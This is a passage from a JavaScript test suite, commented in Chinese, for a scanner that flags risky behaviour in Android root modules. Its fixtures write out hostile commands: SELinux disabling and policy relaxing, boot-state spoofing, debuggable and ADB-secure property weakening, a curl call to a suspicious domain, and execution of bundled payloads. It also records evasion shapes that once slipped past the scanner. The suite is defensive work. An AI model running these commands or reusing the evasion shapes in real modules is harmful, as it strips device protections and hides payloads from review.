    prefixed: 'printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  },
  PROP_SECURITY_WEAKEN: {
    payload: 'ro.debuggable=1',
    prefixed: 'printf "ro.debuggable=1\\n" >> /data/adb/modules/x/system.prop',
  },
  HARDCODED_IP: { payload: 'ping -c1 8.8.8.8' },
  SUSPICIOUS_DOMAIN: { payload: 'curl -s https://track.xyz/p' },
  NETWORK_FETCH: { payload: 'curl -s https://example.com/x' },
  PRIVACY_HOME_USER: { payload: 'cp /home/realuser/x .' },
  PRIVACY_EMAIL: { payload: 'contact=author@realmail.com' },
  PRIVACY_SECRET: { payload: 'API_KEY=Ab3dEfGh1j' },
};

const REQUIRED_RULE_IDS = Object.keys(ANCHOR_WITNESS);

test('fix4-P14：锚点闭包表 —— 每条 line 规则声明 anchor，沉默必须有 witness，跳过与删规则都不算修好', () => {
  // ③-1 必备 id 清单：不许靠「把失败的那条规则删了」把这张表变绿
  for (const id of REQUIRED_RULE_IDS) {
    assert.ok(RULES_BY_ID[id], `${id} 不在规则表里 —— 锚点闭包不能靠删规则来「修」`);
  }
  assert.ok(CONTENT_RULES.length >= REQUIRED_RULE_IDS.length,
    `内容规则从 ${REQUIRED_RULE_IDS.length} 条缩到了 ${CONTENT_RULES.length} 条`);
  assert.equal(new Set(CONTENT_RULES.map((r) => r.id)).size, CONTENT_RULES.length, '规则 id 不许重复');
  // ③-2 witness 表与规则表互为定义：加规则要给 payload，删规则要删 witness，两个方向都拦
  for (const id of REQUIRED_RULE_IDS) {
    assert.ok(CONTENT_RULES.some((r) => r.id === id), `锚点表点名了 ${id}，规则表里却没有它`);
  }

  const ANCHORS = new Set(['line-start', 'anywhere']);
  let covered = 0;
  let anywhere = 0;
  let lineStart = 0;
  for (const r of CONTENT_RULES) {
    // ① 声明必须存在且合法 —— 默认值只许住在工厂里；这张表里写 `r.anchor ?? 'anywhere'` 就是装饰品
    assert.equal(typeof r.anchor, 'string',
      `${r.id} 没有 anchor 声明（实际 ${String(r.anchor)}）：沉默必须显式声明才成立`);
    assert.ok(ANCHORS.has(r.anchor), `${r.id} 的 anchor="${r.anchor}" 不在 'line-start' | 'anywhere' 里`);
    const w = ANCHOR_WITNESS[r.id];
    assert.ok(w && w.payload, `${r.id} 有 anchor 声明却没有锚点 witness —— 没人对账的声明是空话`);
    assert.equal(hits(r.id, w.payload).length, 1,
      `${r.id} 的 witness 载荷本身要恰好命中 1 条：${w.payload}`);

    if (r.anchor === 'anywhere') {
      anywhere++;
      const h = hits(r.id, ANCHOR_PREFIX + w.payload);
      assert.ok(h.length > 0,
        `${r.id} 声明 anywhere，但前缀行「${ANCHOR_PREFIX}${w.payload}」0 命中 —— 行首锚点又回来了`);
      assert.equal(h[0].ruleId, r.id);
    } else {
      lineStart++;
      // ② 声明 line-start 就必须指名那一支「脚本写出」的 sibling，且它真的打得住前缀形态
      assert.ok(w.prefixed, `${r.id} 声明 line-start 却没给出「脚本写出」形态的 witness`);
      assert.ok(r.anchorSibling, `${r.id} 声明 line-start 却没命名 sibling —— 声明必须有 witness`);
      const sib = RULES_BY_ID[r.anchorSibling];
      assert.ok(sib, `${r.id} 的 sibling="${r.anchorSibling}" 在规则表里不存在`);
      assert.ok(sib.anchor === 'anywhere' || sib.id === r.id,
        `${r.id} 的 sibling ${sib.id} 自己不覆盖行中形态（anchor=${String(sib.anchor)}）`);
      const h = sib.scan('service.sh', ANCHOR_PREFIX + w.prefixed).filter((f) => f.severity != null);
      assert.ok(h.length > 0,
        `${r.id} 的 sibling ${r.anchorSibling} 在前缀形态下 0 命中：${ANCHOR_PREFIX}${w.prefixed} —— 那一支是假的`);
      assert.equal(h[0].ruleId, sib.id);
    }
    covered++;
  }
  // ③-3 覆盖度地板：这张表一条都不许跳过（任何 `continue` 分支都会在这里露出来）
  assert.equal(covered, CONTENT_RULES.length, '锚点闭包表必须覆盖每一条规则，一条都不许跳过');
  assert.equal(anywhere + lineStart, CONTENT_RULES.length);
  assert.ok(anywhere >= 21, `anywhere 支只剩 ${anywhere} 条：规则不许悄悄退回行首锚定`);
  assert.ok(lineStart >= 2, `line-start 支只剩 ${lineStart} 条：两条 .prop 规则都要声明`);
});

test('fix4-P14：anchor 声明与规则自己的分支形状对得上（RELAX 改 anywhere，两条 .prop 规则声明 line-start 各有 sibling）', () => {
  assert.equal(RULES_BY_ID.SELINUX_POLICY_RELAX.anchor, 'anywhere',
    'P12 之后 RELAX 不再要求行首，声明必须跟着改 —— 否则下一轮又有人拿 anchor 当挡箭牌');
  assert.ok(!/^\^\\s\*allow/.test(RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source),
    `RELAX 的 pattern 还留着行首锚：${RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source}`);
  for (const id of ['PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
    const r = RULES_BY_ID[id];
    assert.equal(r.anchor, 'line-start', `${id} 的行首一支是真的（.prop 的键就在行首），必须声明出来`);
    assert.equal(r.anchorSibling, id, 'P13 的第二支就在同一条规则里：sibling 指向自己');
    assert.ok(r.pattern.source.includes('>>'), `${id} 的第二支要认得写出重定向，否则 sibling 是空的`);
    // 行首一支不许因为加了第二支而失效
    assert.ok(/^\(\?:\^|\\s\*\w/.test(r.pattern.source) || r.pattern.source.includes('^\\s*'),
      `${id} 丢了行首那一支：${r.pattern.source}`);
  }
  // 工厂负责物化默认值：每张规则对象上都得有这一个字段，而不是测试替它补
  for (const r of CONTENT_RULES) {
    assert.ok('anchor' in r, `${r.id} 的对象上没有 anchor 字段`);
  }
});

test('fix4-P14 端到端：同一族的前缀写法一起进报告，不再靠某一条邻居规则兜着', async () => {
  // 如实写着：这一份夹具在 P14 之前并不是 low —— `>> $MODDIR/system.prop` 被邻居规则
  // MODDIR_RUNTIME_WRITE 抓成 high（实测 eval.f4p14 旧行为：high，但只有那两条）。
  // 这里要证的是**这三条规则自己**都得说话：定级由邻居兜着，等于把「这一族看不看得见」
  // 押在一条意图完全不同的规则上；同一族的相对路径写法（P13 端到端）旧行为是 low → auto-approve。
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p14', files: [
    ['module.prop', moduleProp('eval.f4p14')],
    ['service.sh', [
      '#!/system/bin/sh',
      'MODDIR=${0%/*}',
      'x=1; allow su * * { execute };',
      'x=1; printf "ro.boot.verifiedbootstate=green\\n" >> $MODDIR/system.prop',
      'x=1; printf "ro.debuggable=1\\n" >> $MODDIR/system.prop',
    ].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  const ids = r.findings.filter((f) => f.line >= 3).map((f) => `${f.ruleId}@${f.line}`);
  for (const id of ['SELINUX_POLICY_RELAX', 'PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
    assert.ok(r.findings.some((f) => f.ruleId === id), `${id} 在前缀形态下仍然 0 命中：${JSON.stringify(ids)}`);
  }
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

// ===========================================================================
// fix5（第五轮）—— F1：文件名里的点被当成 dot-source 动词 / 命令位那一支把清理清单读成执行
// ===========================================================================
// 简报在 PerformanC_ReZygisk 的 stock update-binary 第 177-179 行实测到两条 high：
//   rm -rf \
//   $MODPATH/system/placeholder $MODPATH/customize.sh \        <- 实测 high
//   $MODPATH/README.md $MODPATH/.git* 2>/dev/null              <- 实测 high
// 而同一个文件第 153 行 `[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh` 才是真的 source。
// 上面那两行是上一条 `rm -rf` 的**参数续行清单**，一行里没有任何东西被执行。
// 实测归因（见任务报告）：这两条命中来自「命令位那一支」的**行首形态**，不是 dot-source 那一支；
// 两支都要收窄，理由不同，谁也不是装饰：
//   * dot-source 那一支：`.` 只有独立成词才是 source 内建，所以动词后面必须跟空白或 ${IFS}。
//     `.$MODPATH/x` 展开成 `.data/adb/modules/…` 那种相对文件名，`customize.sh` 里那个点更是文件名。
//   * 命令位那一支：行首形态的承诺是「这一行的第一个词就是被执行的模块路径」，而一整行都只是
//     模块路径清单、行尾停在续行反斜杠或重定向上时，它是上一条命令的参数表 —— Magisk 官方模板
//     就是这么写的，于是每个照抄模板的包都白送两条 high。
//   【fix6 更正】上面这一支的修法按「这一行自己的形状」判参数位，形状是投稿者挑的 ⇒ fail-open
//   （详见下面 fix6-F1 那一节）。承重的那条判据换成了「上一条物理行是否以奇数个反斜杠结尾」，
//   也就是逻辑行的命令位；本用例里那两条单行断言随之翻成「必须报」，第五轮的真收益（带
//   `rm -rf \` 上下文的清单沉默）由本用例的第二组断言和下面的端到端用例继续钉住。
// 收窄只作用于「报不报」：被引用的条目照样被 resolveBundledRefs 拉进扫描面（它跑原始 pattern，
// 不看 exclude），所以下面的端到端用例同时钉住「清单行不报」与「清单行引用的东西照样被读过」。

test('fix5-F1：`rm -rf` 续行的纯路径清单 0 命中；同文件那行真 source 仍 high', () => {
  const CONT1 = '$MODPATH/system/placeholder $MODPATH/customize.sh \\';
  const CONT2 = '$MODPATH/README.md $MODPATH/.git* 2>/dev/null';
  const REAL_SOURCE = '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh';
  // fix6 更正：本用例原来在这两行上断言 0 命中 —— 那正是第五轮留下的 fail-open（形状豁免脱离
  // 了上下文）。同一串字符单独成行时命令位就是那个路径，必须报；把它放回 `rm -rf \` 的续行里
  // 才是参数表，才该沉默。第五轮的真收益由下面那个端到端用例（带上下文的形状）继续钉住。
  for (const line of [CONT1, CONT2, `"${CONT1}"`, `"${CONT2}"`]) {
    assertHit('EXEC_BUNDLED_FILE', line, `脱离续行上下文时它就是执行：${line}`);
  }
  for (const line of [CONT1, CONT2]) {
    const t = ['rm -rf \\', CONT1, CONT2].join('\n') + '\n';
    assert.equal(hits('EXEC_BUNDLED_FILE', t, 'service.sh').length, 0,
      `回到 rm -rf 的参数位就不许报：${line}`);
  }
  // 第三行是真的 source：必须还是 high，且是这一行唯一的解释
  const h = assertHit('EXEC_BUNDLED_FILE', REAL_SOURCE, REAL_SOURCE);
  assert.equal(h.length, 1, `一行只该有一条发现：${JSON.stringify(h)}`);
  assert.equal(h[0].severity, 'high', `真 source 那行不许被顺手降档：${JSON.stringify(h[0])}`);
  // 命令位那一支本身不许被关掉：一个路径开头、后面是参数/重定向/到行尾，那仍是「直接执行」
  for (const line of [
    '$MODDIR/tool.bin',
    '  "$MODDIR/tool.bin" --help',
    '$MODDIR/tool.bin > /dev/null',
    '$MODDIR/payload.bin $MODDIR/cfg',
    '$MODDIR/payload.bin $MODDIR/cfg --force',
    '$MODDIR/payload.bin $MODDIR/cfg | tee log',
    'do_thing || $MODDIR/stage2.bin',
  ]) {
    assertHit('EXEC_BUNDLED_FILE', line, `行首命令位形态必须照旧说话：${line}`);
  }
});

test('fix5-F1：`.` 作动词要独立成词 —— 后接空白或 ${IFS}；`.$MODPATH/x` 是相对文件名', () => {
  for (const line of [
    '. $MODDIR/functions',
    '.  $MODPATH/customize.sh',
    '. ${MODDIR}/functions',
    '.\t$MODPATH/x',
    '. "$MODPATH/customize.d/00-verify-resources.sh"',
    '.${IFS}$MODPATH/x',
  ]) {
    assertHit('EXEC_BUNDLED_FILE', line, `真 dot-source：${line}`);
  }
  // 点后面紧跟名字字符 = 文件名的一部分，不是 source 内建：这里以前被 `\.(?!\\d)` 放过
  for (const line of [
    'cp .$MODPATH/payload /tmp/',
    'chmod 755 .$MODPATH/x',
    'rm -rf .$MODPATH/.cache "$TMPDIR/out"',
  ]) {
    assertNoHit('EXEC_BUNDLED_FILE', line, `点是文件名的一部分，不是动词：${line}`);
  }
});

test('fix5-F1 端到端：清理清单不再送 high，真 source 照旧，被引用条目照旧进扫描面', async () => {
  const ub = [
    '#!/system/bin/sh',
    'rm -rf \\',
    '$MODPATH/system/placeholder $MODPATH/customize.sh \\',
    '$MODPATH/README.md $MODPATH/.git* 2>/dev/null',
    '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh',
  ].join('\n') + '\n';
  // A1 之后第 5 行正是「限定路径 + 逐字相符」被降级的那一行 ⇒ 它不能再充当 fix5-F1 的 high 证人。
  // 但这条用例的两侧都要钉住，所以补第二份包：只把被 source 的文件名换掉（`customize.sh` → `setup.sh`，
  // 其余一字不动）⇒ 判据②不相等 ⇒ 必须回到 high。「清单行沉默、真 source 照报」这件事从此由 ub2 说话。
  const ub2 = ub.split('$MODPATH/customize.sh').join('$MODPATH/setup.sh');
  const zip = makeModuleZip({ id: 'eval.f5f1', files: [
    ['module.prop', moduleProp('eval.f5f1')],
    ['META-INF/com/google/android/update-binary', ub],
    ['system/placeholder', 'setenforce 0\n'],
  ] });
  const zip2 = makeModuleZip({ id: 'eval.f5f1b', files: [
    ['module.prop', moduleProp('eval.f5f1b')],
    ['META-INF/com/google/android/update-binary', ub2],
    ['system/placeholder', 'setenforce 0\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const r2 = await scanToReport(zip2, { changeType: 'first' });
  const eb = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.deepEqual(eb.map((f) => f.line), [5],
    `清单那两行（3、4）不许报，真 source 那行（5）照报：${JSON.stringify(eb.map((f) => `${f.line}[${f.snippet}]`))}`);
  assert.equal(eb[0].severity, 'info',
    'A1：模板逐字那一行按标准安装流程形状记录 —— 证据仍在（不是 null），档位在 info（不是 low）');
  const eb2 = r2.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.deepEqual(eb2.map((f) => f.line), [5], '同一份清单形状，换文件名不许影响清单那两行的沉默');
  assert.equal(eb2[0].severity, 'high', 'fix5-F1 的 high 证人搬家到这里：被 source 的名字不相等就必须回到 high');
  // 两条豁免各管一件事，都只影响**呈现**：fix5-F1 让清单那两行沉默，A1 让模板那一行降档。
  // 清单行引用的 system/placeholder 照样被读掉 —— 扫描面一条都不许缩。
  // Task 2.7（fix10-P11）：它是可读文本，本来就在 feed 上 → 没有升级证人，但内容确实逐行扫过。
  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
  assert.deepEqual(r.escalated, [],
    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
    `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
  assert.ok(r2.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
    '第二份同理：载荷必须照样被读过，换文件名不许让扫描面变小');
  assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
  assert.equal(r2.riskLevel, 'high', '第二份整包照旧 high ⇒ 搬家后的 fix5-F1 证人仍能在定级层说话');
});

// ===========================================================================
// fix5（第五轮）—— F2：DEBUGGABLE_ENABLE 不看值，把「把属性刷回安全值」当成罪状
// ===========================================================================
// 简报实测（snake-4/Zygisk-Assistant 的 post-fs-data.sh，这个模块的全部工作就是刷回锁定值）：
//   medium  resetprop_if_diff ro.secure 1        <- 加固，不是罪状
//   medium  resetprop_if_diff ro.debuggable 0    <- 加固，不是罪状
//   medium  resetprop ro.secure 0                <- 削弱，必须报
//   medium  resetprop ro.debuggable 1            <- 削弱，必须报
// 旧 pattern 的尾巴是 `[=\s]+[01]\b`：`0` 和 `1` 两个方向都收，于是它给这个包白送 2 条 medium，
// 把整包 medium 从 7 顶到 9 —— 报的还是「作者在恢复安全」这件事本身。
// 收窄必须和 .prop 那一侧一起收：fix3-P9 的 PROP_SECURITY_WEAKEN 认的是「具名键 + 削弱值」四对
// （ro.debuggable=1 / ro.secure=0 / ro.adb.secure=0 / service.adb.root=1），脚本侧以前只认两个键
// 且不看值。两边各写一份字面量就会各说各话 —— 所以键值对只许有一份，导出成常量，两条规则都从它生成。

test('fix5-F2：DEBUGGABLE_ENABLE 认得值 —— 加固值 0 命中，削弱值照旧 medium', () => {
  // 简报那四行的原样复现
  const WEAKEN = [
    'resetprop ro.secure 0',
    'resetprop ro.debuggable 1',
    'setprop ro.debuggable 1',
    'resetprop -w ro.adb.secure 0',
    'setprop service.adb.root 1',
    'resetprop_if_diff ro.secure 0',
    'su -c "resetprop -n ro.debuggable 1"',
    'resetprop ro.secure=0',
  ];
  const HARDEN = [
    'resetprop_if_diff ro.secure 1',
    'resetprop_if_diff ro.debuggable 0',
    'resetprop_if_diff ro.adb.secure 1',
    'resetprop_if_diff service.adb.root 0',
    'resetprop ro.secure 1',
    'setprop ro.debuggable 0',
    'resetprop -n ro.adb.secure 1',
    'setprop service.adb.root=0',
    'resetprop ro.secure 01',                   // 不是那个具名值
    'resetprop ro.secure 10',
    'resetprop ro.debuggable 12',
  ];
  for (const line of WEAKEN) {
    const h = assertHit('DEBUGGABLE_ENABLE', line, line);
    assert.equal(h[0].severity, 'medium', `削弱值仍是 medium：${line}`);
  }
  for (const line of HARDEN) assertNoHit('DEBUGGABLE_ENABLE', line, `这是安全值，不是 offence：${line}`);
});

test('fix5-F2：脚本侧与 .prop 侧共用同一份「键→削弱值」表，两个方向都不许各说各话', async () => {
  const PAIRS = (await import('./risk-rules.mjs')).SECURITY_WEAKEN_PAIRS;
  assert.ok(Array.isArray(PAIRS) && PAIRS.length >= 4,
    `两条规则必须从同一份导出的键值表生成，实际 ${JSON.stringify(PAIRS)}`);
  const OPPOSITE = { '0': '1', '1': '0' };
  for (const pair of PAIRS) {
    assert.ok(pair && pair.key && OPPOSITE[pair.weaken], `表里每一项都要是 { key, weaken }：${JSON.stringify(pair)}`);
    const { key, weaken } = pair;
    const safe = OPPOSITE[weaken];
    // 同一对 (键, 削弱值) 在两侧都得说话，同一个 (键, 安全值) 在两侧都得沉默 —— 少一项就是各说各话
    assertHit('DEBUGGABLE_ENABLE', `resetprop ${key} ${weaken}`, `脚本侧要认削弱值：${key} ${weaken}`);
    assertHit('DEBUGGABLE_ENABLE', `setprop ${key}=${weaken}`, `脚本侧要认 = 写法：${key}=${weaken}`);
    assertNoHit('DEBUGGABLE_ENABLE', `resetprop ${key} ${safe}`, `脚本侧不许把加固值当罪状：${key} ${safe}`);
    assertHit('PROP_SECURITY_WEAKEN', `${key}=${weaken}`, `.prop 侧要认削弱值：${key}=${weaken}`);
    assertNoHit('PROP_SECURITY_WEAKEN', `${key}=${safe}`, `.prop 侧不许把加固值当罪状：${key}=${safe}`);
    // 一种输入形状只许由一条规则说话，同一件事不许双报
    assertNoHit('PROP_SECURITY_WEAKEN', `resetprop ${key} ${weaken}`, '脚本那一行归脚本侧：' + key);
    assertNoHit('DEBUGGABLE_ENABLE', `${key}=${weaken}`, '属性文件那一行归文件侧：' + key);
  }
  // 两边的 pattern 都必须是从这张表生成的：表里每个键都出现在两条规则的 pattern.source 里；
  // 而表外的键两条都不许说话 —— 单边加键、单边删键、单边改值，三个方向都拦得住。
  for (const [id, rule] of [['DEBUGGABLE_ENABLE', RULES_BY_ID.DEBUGGABLE_ENABLE], ['PROP_SECURITY_WEAKEN', RULES_BY_ID.PROP_SECURITY_WEAKEN]]) {
    for (const { key } of PAIRS) {
      const esc = key.replace(/\./g, '\\.');
      assert.ok(rule.pattern.source.includes(esc),
        `${id} 的 pattern 里没有表里的键 ${key} —— 那份键表是抄的，不是同源的`);
    }
  }
  for (const key of ['ro.force.debuggable', 'debug.sf.hw', 'ro.boot.flash.locked']) {
    for (const v of ['0', '1']) {
      assertNoHit('DEBUGGABLE_ENABLE', `setprop ${key} ${v}`, `表外的键不许从脚本侧进来：${key}=${v}`);
      assertNoHit('PROP_SECURITY_WEAKEN', `${key}=${v}`, `表外的键不许从 .prop 侧进来：${key}=${v}`);
    }
  }
});

test('fix5-F2 端到端：把属性刷回锁定值的模块不再白送 medium，真削弱那行照旧报', async () => {
  const hardening = await scanToReport(makeModuleZip({ id: 'eval.f5f2a', files: [
    ['module.prop', moduleProp('eval.f5f2a')],
    ['post-fs-data.sh', ['#!/system/bin/sh',
      'resetprop_if_diff ro.adb.secure 1',
      'resetprop_if_diff ro.debuggable 0',
      'resetprop_if_diff ro.secure 1',
      'resetprop_if_diff service.adb.root 0'].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  assert.deepEqual(hardening.findings.filter((f) => f.ruleId === 'DEBUGGABLE_ENABLE'), [],
    `恢复安全值不是罪状：${JSON.stringify(hardening.findings.map((f) => `${f.ruleId}@${f.line}`))}`);
  assert.equal(hardening.counts.medium, 0, `这四行不该顶高任何 medium：${JSON.stringify(hardening.counts)}`);

  const weakening = await scanToReport(makeModuleZip({ id: 'eval.f5f2b', files: [
    ['module.prop', moduleProp('eval.f5f2b')],
    ['post-fs-data.sh', ['#!/system/bin/sh',
      'resetprop_if_diff ro.adb.secure 1',
      'resetprop ro.debuggable 1',
      'resetprop_if_diff ro.secure 1',
      'setprop ro.adb.secure 0'].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  const dbg = weakening.findings.filter((f) => f.ruleId === 'DEBUGGABLE_ENABLE');
  assert.deepEqual(dbg.map((f) => f.line), [3, 5],
    `同一份文件里的两条削弱值（第 3、5 行）都要报、三条加固值（2、4 与 shebang）都不报：${JSON.stringify(dbg.map((f) => f.line))}`);
  assert.ok(dbg.every((f) => f.severity === 'medium'), JSON.stringify(dbg));
});

// ===========================================================================
// fix6（第六轮）—— F1：续行豁免不许只看这一行的形状 —— 命令位判在**逻辑行**上
// ===========================================================================
// 第五轮为了抹掉 ReZygisk 的 update-binary:178/179 那两条 FP，给 EXEC_BUNDLED_FILE 加了一条
// 形状豁免：「整行是纯模块路径清单、行尾停在续行反斜杠或重定向上」就不报。形状是投稿者自己
// 挑的，于是它成了第六个可伪造的免死金牌。以下全部在第五轮的提交（5a5a3ff）上实测为 0 命中：
//   $MODPATH/payload $MODPATH/x \                            0 命中
//   $MODPATH/payload $MODPATH/x 2>/dev/null                  0 命中
//   "$MODPATH/payload" "$MODPATH/x" \                        0 命中
//   /data/adb/modules/eval/x /data/adb/modules/eval/y \      0 命中
// shell 的语义是：一行第一个 token 是路径 = **执行它**，后面的全是参数。所以
// `"$MODPATH/payload" "$MODPATH/x" 2>/dev/null` 真的把随包提交的那个文件跑了一遍，而扫描器
// 一个字都没说。豁免只有在「这一行确实处于参数位」时才是对的，而参数位与否由**上一条物理行
// 是否以奇数个反斜杠结尾**决定（`\\` 是转义反斜杠、不算续行），不由这一行自己的形状决定。
// 新判据四条同时成立才沉默（fail closed）：
//   ① 这一行是上一条的续行；
//   ② 拼出的逻辑行的命令位不是模块路径（是路径就是执行，照报）；
//   ③ 逻辑行的命令位是「只吃文件参数、不执行参数」的动词白名单里的词（rm/cp/chmod/chcon/…）；
//   ④ 这一行本身仍是第五轮那条纯清单形状（复用 isModulePathListLine，没有另起炉灶）。
// 四条都是收不是放：新豁免 ⊆ 旧豁免 ⇒ 命中只增不减，第五轮的真收益一条都没丢。

const FIX6_LIST_A = '$MODPATH/system/placeholder $MODPATH/customize.sh \\';
const FIX6_LIST_B = '$MODPATH/README.md $MODPATH/.git* 2>/dev/null';
const FIX6_LIST_C = '$MODPATH/payload $MODPATH/x 2>/dev/null';
const bs = (n) => '\\'.repeat(n);

test('fix6-F1：单成的「纯模块路径清单 + 续行反斜杠/重定向」一律照报 —— 命令位就是那个路径', () => {
  // 第五轮把这四种形状读成了「上一条命令的参数表」，可它们前面根本没有上一条命令：
  // 第一个 token 是路径，就是执行随包提交的那个文件。
  for (const line of [
    '$MODPATH/payload $MODPATH/x \\',
    FIX6_LIST_C,
    '"$MODPATH/payload" "$MODPATH/x" \\',
    '"$MODPATH/payload" "$MODPATH/x" 2>/dev/null',
    "'$MODPATH/payload' '$MODPATH/x' 2>/dev/null",
    '${MODDIR}/payload ${MODDIR}/x \\',
    '${MODDIR}/payload ${MODDIR}/x 2>/dev/null',
    '$TMPMODDIR/payload $TMPMODDIR/x \\',
    '/data/adb/modules/eval/x /data/adb/modules/eval/y \\',
    '/data/adb/modules/eval/x /data/adb/modules/eval/y 2>/dev/null',
    '   $MODPATH/payload $MODPATH/x 2>/dev/null',
    // 第五轮实测吃掉的正是 ReZygisk 那两行的形状 —— 单独成行时它就是「执行第一个路径」
    FIX6_LIST_A,
    FIX6_LIST_B,
  ]) {
    const h = assertHit('EXEC_BUNDLED_FILE', line, `行首命令位是模块路径：${line}`);
    assert.equal(h[0].severity, 'high', `这一行在执行随包提交的文件，不许降档：${line}`);
  }
});

test('fix6-F1：命令位判在逻辑行上 —— `rm -rf \\` 之后的清单照旧沉默（第五轮的真收益）', () => {
  const text = (head) => ['#!/system/bin/sh', head, FIX6_LIST_A, FIX6_LIST_B].join('\n') + '\n';
  for (const head of [
    'rm -rf \\',
    'rm -rf ${MODDIR}/old \\',
    'cp -af \\',
    'chmod 750 \\',
    'chown root:root \\',
    'chcon u:object_r:system_file:s0 \\',
    'restorecon -RF \\',
  ]) {
    const h = hits('EXEC_BUNDLED_FILE', text(head), 'service.sh');
    assert.equal(h.length, 0,
      `${head} 之后那两行是它的参数表，一行里没有任何东西被执行：${JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`))}`);
  }
  // 官方模板就是这个形状（ReZygisk 的 stock update-binary 177-179 行）—— 三个动词连写也照样沉默
  const chained = ['rm -rf ${MODDIR}/system \\', 'rm -rf \\', FIX6_LIST_A, FIX6_LIST_B, 'ui_print done'].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', chained, 'service.sh').length, 0, JSON.stringify(hits('EXEC_BUNDLED_FILE', chained, 'service.sh')));
});

test('fix6-F1：伪造一条以反斜杠结尾的前导行不是免死金牌 —— 白名单外的命令位一律照报', () => {
  // 这一条是本轮的正面主张：豁免的成立与否只取决于命令位，而命令位是投稿者写出来的**动词**，
  // 白名单外的任何词（空操作、没见过的命令、eval、赋值前缀、解释器、路径本身）都不构成
  // 「这一行处于参数位」的立论依据。判不了就当它是执行。
  for (const head of [
    ': \\',                    // 空操作 + 续行：它确实不执行参数，但它也不在动词白名单里
    'foo \\',                  // 没见过的命令：判不了，fail closed
    'eval \\',                 // eval 会把它拼出来的东西跑一遍
    'xargs \\',                // xargs 把第一个参数当命令执行
    'env \\', 'time \\', 'sudo \\', // 前导类：后面的词就是要跑的东西
    'sh \\', 'bash \\', 'source \\', 'exec \\', 'nohup \\',
    'x=$MODPATH/probe \\',     // 赋值前缀：`VAR=… cmd args` 里 cmd 照样执行
    '$MODPATH/probe \\',       // 命令位本身就是模块路径 —— 整条逻辑行都是执行
    '"$MODPATH/probe" \\',
    bs(1) + ' echo ok',        // 前导行不以反斜杠结尾（这里反斜杠在行首）—— 第二行是新命令
  ]) {
    const t = [head, FIX6_LIST_C].join('\n') + '\n';
    const h = assertHit('EXEC_BUNDLED_FILE', t, `前导行 ${JSON.stringify(head)} 不构成立论依据`);
    assert.ok(h.some((f) => f.line === 2),
      `清单那一行（第 2 行）必须在发现里：${JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`))}`);
    assert.equal(h[0].severity, 'high', JSON.stringify(h[0]));
  }
});

test('fix6-F1：续行的判据是「行尾奇数个反斜杠」—— `\\\\` 是转义反斜杠，不是续行', () => {
  // 偶数个行尾反斜杠 = 一个转义后的字面量反斜杠，物理行到此为止 ⇒ 下一行站在命令位上
  const evenText = ['rm -rf "$MODPATH/old"' + bs(2), FIX6_LIST_C].join('\n') + '\n';
  const even = assertHit('EXEC_BUNDLED_FILE', evenText, '行尾 \\\\ 不是续行，第二行是命令位');
  assert.deepEqual(even.map((f) => f.line), [2], JSON.stringify(even.map((f) => `${f.line}:${f.snippet}`)));
  // 奇数个（3）才是续行：前两个拼成字面量反斜杠参数，第三个把命令接下去
  const oddText = ['rm -rf "$MODPATH/old"' + bs(3), FIX6_LIST_A, FIX6_LIST_B].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', oddText, 'service.sh').length, 0,
    JSON.stringify(hits('EXEC_BUNDLED_FILE', oddText, 'service.sh').map((f) => `${f.line}:${f.snippet}`)));
  // 续行链上任意一行都共用同一个命令位：中间那行末尾又是反斜杠时，最后一行仍在参数位
  const deep = ['rm -rf \\', FIX6_LIST_A, FIX6_LIST_A, FIX6_LIST_C].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', deep, 'service.sh').length, 0, JSON.stringify(hits('EXEC_BUNDLED_FILE', deep, 'service.sh')));
  // 但逻辑行一旦在清单之前收口，后面那行就重新站到命令位上
  const after = ['rm -rf \\', FIX6_LIST_B, FIX6_LIST_C].join('\n') + '\n';
  const h = assertHit('EXEC_BUNDLED_FILE', after, '第二行没有以续行结尾，第三行是新命令的命令位');
  assert.deepEqual(h.map((f) => f.line), [3], JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`)));
});

test('fix6-F1 端到端：`rm -rf` 续行的清单沉默，紧随其后的同形状攻击行必须报，扫描面不许缩小', async () => {
  const ub = [
    '#!/system/bin/sh',
    'rm -rf \\',
    FIX6_LIST_A,
    FIX6_LIST_B,
    '$MODPATH/webroot/stager.bin $MODPATH/webroot/cfg.bin 2>/dev/null',
  ].join('\n') + '\n';
  const zip = makeModuleZip({ id: 'eval.f6f1', files: [
    ['module.prop', moduleProp('eval.f6f1')],
    ['META-INF/com/google/android/update-binary', ub],
    ['system/placeholder', 'setenforce 0\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const eb = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.deepEqual(eb.map((f) => f.line), [5],
